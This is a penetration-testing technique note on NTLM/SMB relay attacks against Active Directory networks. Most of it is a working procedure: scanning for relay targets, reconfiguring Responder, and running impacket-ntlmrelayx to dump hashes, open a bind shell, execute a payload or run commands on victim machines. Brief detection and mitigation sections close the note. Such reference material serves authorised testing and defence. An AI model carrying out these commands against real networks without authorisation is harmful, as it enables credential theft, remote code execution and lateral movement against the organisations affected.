---
tags:
  - "#type/technique"
  - "#stage/initial-access"
  - "#protocol/llmnr"
  - "#protocol/netbios"
  - "#protocol/smb"
  - "#tactic/TA0001"
  - "#os/windows"
  - "#tool/responder"
  - "#tool/ntlmrelayx"
  - privileges/unauthenticated
aliases:
  - NTLM Relay
  - SMB Relay
  - Man-in-the-Middle Attack
---
## Technique
___
Relay attacks capture authentication attempts (usually NTLM hashes) and relay them to target machines for various types of access. Instead of cracking the hash, the attacker passes it directly to another system to authenticate as the victim user.

This technique is particularly effective in Active Directory environments where:
- SMB signing is disabled or "not required" (common in many networks)
- The relayed credentials belong to an administrative user on the target machine

## Prerequisites
___

**Access Level:** Network access to the target environment

**System State:** 
- Target machines must have SMB signing disabled or not required
- Relayed credentials must have administrative privileges on the target

**Information:** Knowledge of potential target machines in the network

## Considerations
___

**Impact**

Successful relay attacks can provide administrative access to systems without the need to crack passwords, enabling an attacker to move laterally through a network very efficiently.

**OPSEC**

- Authentication attempts are logged on target systems
- Network traffic may be monitored for relay activity
- Failed relay attempts might trigger security alerts

## Execution
___
### Identifying Relay Targets

#### **Automated Tools**

[RunFinger.py](https://github.com/lgandx/Responder/blob/master/tools/RunFinger.py) included with Responder can scan the network for potential relay targets for:

- SMB
- MSSQL
- RDP

```bash
python3 RunFinger.py -i 192.168.1.0/24
```

**NetExec** will automatically generate a list of targets with --gen-relay-list for SMB:

```bash
nxc smb 192.168.1.0/24 --gen-relay-list output.txt
```

### Setting Up a Relay Attack

#### **Responder + ntlmrelayx**

1. Edit Responder configuration to disable SMB and HTTP servers:
```bash
sudo nano /etc/responder/Responder.conf
# Change:
SMB = On --> Off
HTTP = On --> Off
```

2. Create a targets list:
```bash
echo "<TargetIP>" > targets.txt
```

3. Run Responder:
```bash
sudo responder -I eth0 -wv
```

4. Start ntlmrelayx with any of these options:

**Dump hashes:**
```bash
sudo impacket-ntlmrelayx -tf targets.txt -smb2support
```

**Get semi-interactive smbexec bind shell** (connect with `nc localhost 11000`):
```bash
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i
```

**Execute payload:**
```bash
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -e payload.exe
```

**Execute Command:**
```bash
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'
```

5. Wait for authentication attempts or coerce authentication attempts from target users.

### Cleanup Considerations

- Stop Responder and ntlmrelayx when finished
- Remove any created files or payloads on target systems

### Detection & Mitigation

#### Detection

- Monitor for multiple failed authentication attempts from unexpected sources
- Watch for authentication events where the source IP doesn't match expected client locations
- Look for unusual SMB traffic patterns across the network

#### Mitigation

- Enable SMB signing on all systems (ideally, require it rather than just enabling it)
- Implement LDAP signing and channel binding
- Use Credential Guard in Windows to prevent NTLM credential theft
- Disable NTLM authentication where possible in favor of Kerberos
- Segment networks to limit the scope of potential relay attacks